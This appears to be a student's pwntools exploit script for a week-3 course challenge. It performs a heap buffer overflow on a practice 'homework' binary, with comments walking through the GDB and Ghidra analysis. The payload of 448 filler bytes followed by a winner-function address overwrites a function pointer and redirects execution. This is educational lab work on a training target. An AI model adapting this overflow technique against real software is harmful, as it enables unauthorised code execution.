#!/usr/bin/env python3
'''
Python script submission for the 'homework' binary for
Week 3. By Sparsh Mehta/hutgrabber
'''
import sys
from time import sleep
import pwn
import os
'''
---------------------------------------------------------- PREFACE -----------------------------------------------------------
This week we are focusing performing heap based buffer overflows. We are presented with a homework binary that has many function
calls in it this time. Running `info func` presents you with a huge list of functions inside. This time it is a little overwhelming
for beginners. The preliminary enumeration can be done through ghidra but the main thing to watch is the `malloc()` calls. It is
important to point out where this is happening to point out buffer size allocation in the program.
-------------------------------------------------------------------------------------------------------------------------------
'''

'''
The steps to exploit this binary are given below:
1. The program takes user input multiple times. It is important to find where the overflow has to occur. This can be done using
    ghidra & some brute forcing.
2. Our prelimnary goal is to crash the program. After several attempts, I was able to pin point that the part where the program
    asks for the description length, is where the `malloc()` call is taking place. Whatever is entered here, is the size of the
    heap.
3. I have set the description size to be 65. This means that the `malloc()` call will allocate 65 chunks of memory to the input.
4. Next we need to figure out what should be the size of the payload so that it perfectly aligns up until the function pointer.
    Only when the buffer is completely filled, can we overwrite the function pointer with the winnder's address.
5. Setting a break point at `call rdx` shows that the `tellAJoke()` function is being called by the instruction at b *whatToDo()+188.
6. We need to replace the address of the `tellAJoke()` function with the winnder function's address. When we run `info func win`,
    we can find the winner function's address - 0x0400bed.
7. We need to bruteforce multiple times in order to perfectly align the buffer + the winner function's address in order to over
    write the function pointer in this program.
8. However, once the alignment is done, this program turns into something like a basic stack based buffer overflow. Which
    overwrites the return pointer.
9. Commands like `heap`, `vis` & examine (`x/wx` or `x/10s`) can be used from within pwn-dbg to learn more about what is going on
    inside the heap and the bins.
'''
# Boilerplate for starting a binary locally, in GDB, or remotely.
def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], env={'LD_PRELOAD': '/challenge/libc-2.27.so'}, gdbscript=gdbscript)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath], env={'LD_PRELOAD': '/challenge/libc-2.27.so'})


# Binary Path
binPath = "/challenge/homework"

gdbscript = """
set environment LD_PRELOAD /challenge/libc-2.27.so 
set max-visualize-chunk-size 0x500
set glibc 2.27
b *whatToDo+188
continue
""".format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = 'critical'
io = start()

winner_function = pwn.p64(0x0000000000400bed)
try:
    io.recvline()  # Welcome to the comedy club!
    io.recvline()  # What is the name of your act?
    io.recvline()  # Please set up for your act

    io.sendline(b'ba')  # ba

    io.recvline()  # Your act code is:
    io.recvline()  # How long do you want the show description to be?

    io.sendline(b'65')

    io.recvline()  # Describe the show for us.

    io.sendline(b'A' * 448 + winner_function)  # payload
    io.recvlines(7)  # action menu

    io.recvuntil(b'Action: ')  # Acion:

    io.sendline(b'1')  # 1

    pwnd = io.recvline().strip().decode('utf-8')

    print('\n' + pwnd + '\n')


except EOFError:
    pass
